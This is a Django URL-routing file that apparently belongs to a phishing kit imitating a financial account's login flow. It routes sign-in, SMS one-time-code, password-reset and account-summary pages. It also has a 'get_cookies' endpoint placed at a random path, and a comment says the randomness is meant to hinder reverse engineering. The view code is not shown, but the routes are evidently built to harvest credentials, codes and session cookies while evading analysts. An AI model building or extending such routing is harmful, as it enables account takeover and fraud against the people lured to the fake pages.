from django.contrib import admin
from django.urls import path
from homepage.views import home, reset_pass, otp, enter_otp, get_cookies, show_dashboard, deauthorize

urlpatterns = [
    path('admin/', admin.site.urls),
    path('signin/', home, name='homepage'),
    path('authflow/entry/<random1>/<identifier>/<random2>/<random3>/', otp, name='otp'),
    path('authflow/challenges/sms/<random1>/<identifier>/<random2>/<random3>/', enter_otp, name='enter_otp'),
    path('myaccount/summary/<random1>/<identifier>/<random2>/<random3>/', show_dashboard, name='dashboard'),
    path('authflow/password-recovery/change/<random1>/<random2>/<random3>/', reset_pass, name='reset'),
    # Random URL to make it harder to find when reverse engineering.
    path('er2t4dwrff3/23233ed2dc2/', get_cookies, name='get_cookies'),
    path('myaccount/transactions/details/<identifier>/308HIN23F239128JI/', deauthorize, name="deauthorize")
]

# State HTML page for 400, 403 and 404 errors.
handler400 = 'homepage.views.handle404'
handler403 = 'homepage.views.handle404'
handler404 = 'homepage.views.handle404'